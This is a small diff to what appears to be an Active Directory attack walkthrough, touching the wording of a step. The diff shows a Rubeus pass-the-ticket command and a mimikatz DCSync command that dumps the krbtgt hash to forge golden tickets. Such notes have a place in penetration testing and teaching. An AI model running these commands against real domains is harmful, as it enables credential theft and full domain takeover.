@@ -16,6 +16,6 @@
 	
  ```Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...```
 
-5th(mimikatz) Since CDC01$ is not a local administrator account on the domain controller we cannot perform direct lateral movement, instead we will perform dcsync to dump the krbtgt NTLM hash to create golden tikcets
+5th(mimikatz) Since CDC01$ is not a local administrator account on the domain controller we cannot perform direct lateral movement. Instead we will perform dcsync(since APPSRV01 has domain replication permissions) to dump the krbtgt NTLM hash to create golden tikcets
 	
  ```lsadump::dcsync /domain:contoso.com /user:contoso\krbtgt```
